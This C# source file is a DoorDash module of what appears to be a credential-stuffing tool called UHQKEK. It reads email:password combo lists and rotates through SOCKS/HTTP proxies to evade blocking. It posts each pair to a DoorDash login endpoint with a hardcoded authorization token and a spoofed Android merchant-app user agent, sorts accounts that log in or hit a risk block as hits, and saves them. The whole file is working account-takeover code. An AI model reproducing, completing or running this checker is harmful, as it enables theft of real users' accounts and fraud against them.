using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class DoorDash
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AllowAutoRedirect = true;

                httpRequest.AddHeader("accept-encoding", "gzip");
                httpRequest.AddHeader("authorization", "Ft98fOkQwIcAAAAAAAAAANmMvfQvWUg8AAAAAAAAAACimJeZMkWvEwAAAAAAAAAA");
                httpRequest.AddHeader("content-type", "application/json; charset=UTF-8");
                httpRequest.AddHeader("user-agent", "DoorDashMerchant/2.79.3 (Android 9; Google Pixel 3)");
                string str1 = httpRequest.Post("URL HERE", "{\"credentials\":{\"password\":\""+strArray1[1]+ "\",\"email\":\""+strArray1[0]+ "\"}}", "application/json").ToString();

                if(str1.Contains("user_info") || str1.Contains("RISK-403-BLOCK-LOGIN") || str1.Contains("generatePasscode"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "DoorDash");
                    return true;
                }
                else if(str1.Contains("Unable to login with this email address and password.") || str1.Contains("Check your login information and try again.") || str1.Contains("Unable to login with this email address and password. Check your login information and try again.") || str1.Contains("You haven't set a password for this account. Use the 'Forgot Password?' link to set one."))
                {
                    Interlocked.Increment(ref Program.Fail);
                    Interlocked.Increment(ref Program.Check);
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else if(str1.Contains("Your account has been deactivated"))
                {
                    ++Program.Free;
                    ++Program.Check;
                    ++Program.Cps;
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Orange);
                    }
                    Program.Save(combo, "Netflix Free");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
